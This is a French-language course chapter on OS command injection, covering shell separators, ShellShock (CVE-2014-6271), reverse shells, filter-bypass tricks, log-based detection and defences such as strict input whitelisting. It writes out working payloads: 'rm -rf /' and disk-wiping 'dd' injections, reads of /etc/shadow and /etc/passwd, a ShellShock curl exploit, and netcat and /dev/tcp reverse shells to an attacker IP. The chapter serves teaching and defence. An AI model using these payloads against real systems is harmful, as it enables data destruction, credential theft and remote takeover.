---
title: "Chapitre 5 -- Injection de commandes"
sidebar_position: 5
---

# Chapitre 5 -- Injection de commandes

> Sources : 2026-Command Injections.pdf, 2026 Shell for Security.pdf
> Objectif : comprendre les injections OS, les reverse shells, et les protections

---

## 5.1 Concept de base

Quand une application utilise une commande systeme avec des parametres fournis par l'utilisateur :

```
Application web                 Systeme d'exploitation
     |                                  |
     |  system("ping -c4 " + $IP)       |
     |--------------------------------->|
     |  Resultat du ping                |
     |<---------------------------------|
```

### Caracteres speciaux du shell

| Caractere | Role |
|-----------|------|
| `;` | Separateur de commandes |
| `\|` | Pipe (sortie vers entree d'une autre) |
| `&&` | Execute la 2e si la 1ere reussit |
| `\|\|` | Execute la 2e si la 1ere echoue |
| `` `cmd` `` | Substitution de commande (ancienne syntaxe) |
| `$(cmd)` | Substitution de commande (syntaxe moderne) |
| `\n` | Nouvelle ligne = nouveau separateur |

---

## 5.2 Exemples d'injection

### Injection basique (ping)

```
Entree normale   : 210.1.43.27
Commande         : ping -c4 210.1.43.27

Entree malicieuse : 210.1.43.27;rm -rf /
Commande          : ping -c4 210.1.43.27;rm -rf /
```

### Substitution de commande

```bash noexec
$ ./script.sh "`cat /etc/shadow`"
# Affiche le contenu du fichier shadow
```

### ShellShock (CVE-2014-6271)

```bash noexec
# Test de vulnerabilite
env x='() { :;}; echo vuln' bash -c "test"

# Exploitation via HTTP User-Agent
curl -A "() { :;};cat /etc/passwd" http://target/cgi-bin/some.cgi
```

ShellShock exploite un bug dans le parsing des fonctions dans les variables d'environnement Bash.

---

## 5.3 Reverse shells

La machine compromise initie la connexion vers l'attaquant (contourne les firewalls).

```
Attaquant (listener)            Cible (compromise)
     |                              |
     | nc -lvp 4443                 |
     |<-----------------------------|  connexion initiee par la cible
     | shell interactif             |
     |<---------------------------->|
```

### Variantes (contexte educatif -- comprendre pour defendre)

```bash noexec
# Netcat
nc -e /bin/sh 192.168.174.1 4443

# Bash
bash -i >& /dev/tcp/192.168.174.1/4443 0>&1

# Syntaxe sans espaces (contourne certains filtres)
{cat,file1,file2}  # equivalent a : cat file1 file2
```

---

## 5.4 Le shell comme outil defensif

| Commande | Usage securite |
|----------|---------------|
| `sort \| uniq -c \| sort -nr` | Frequence des termes (top-N dans les logs) |
| `wc -L` | Trouver les lignes anormalement longues |
| `fgrep -Iri passw` | Rechercher des mots de passe dans les fichiers |
| `script -a session.log` | Enregistrer une session (audit) |
| `shuf file -n 32` | Echantillon aleatoire de 32 lignes |

---

## 5.5 Protections

### Hierarchie

```
1. EVITER les appels systeme (utiliser les fonctions natives du langage)
2. Whitelist + framework
3. Encoder, echapper (fonctions du langage)
4. Liste noire (jamais complete)
5. "Esperons que personne n'injectera ici" (MAUVAIS)
```

### Exemple : proteger la fonction ping

```
Regex stricte pour IPv4 :
^([0-9]{1,3}\.){3}[0-9]{1,3}$

Toute entree qui ne correspond pas est rejetee.
```

### Sources d'entrees dangereuses

Pas seulement les formulaires : variables d'environnement, cookies, date/heure, valeurs d'autres serveurs, fichiers de sauvegarde.

---

## 5.6 Exemples de DS

### Identifier une injection CMD dans les logs

```
test.php?action="ping"&address="216.120.237.101"&dir C:\"    --> CMD
test.php?traceroute="|| echo reboot > /etc/rc.local"         --> CMD
dostuff.php?dir=; dd if=/dev/urandom of=/dev/sda bs=4069;    --> CMD
```

Indices : `;`, `|`, `||`, `&&`, noms de commandes (`echo`, `cat`, `rm`, `dd`, `sleep`), chemins (`/etc/`, `/dev/`).

### Distinguer injection SQL vs CMD (Sujet 2020)

```
Login = ' OR 'a'='a  --> Reponse: "-bash: OR: command not found"
```
C'est une injection de **commande**, pas SQL (le login est passe au shell, pas a une requete SQL).

---

## CHEAT SHEET -- Injection de commandes

```
SEPARATEURS : ;  |  ||  &&  `cmd`  $(cmd)  \n

PROTECTION :
  1. Eviter les appels OS (fonctions natives)
  2. Whitelist regex : ^([0-9]{1,3}\.){3}[0-9]{1,3}$
  3. Encoder / echapper

DISTINGUER SQL vs CMD :
  Erreur SQL    : "syntax error near..."
  Erreur CMD    : "-bash: command not found"

REVERSE SHELL :
  La cible initie la connexion (contourne firewall)
  Detection : connexions sortantes inattendues

SHELLSHOCK (CVE-2014-6271) :
  env x='() { :;}; echo vuln' bash -c "test"
  CVSS 9.8 CRITICAL

ASTUCE CONTOURNEMENT :
  {cat,file1,file2} = cat file1 file2 (sans espaces)
```
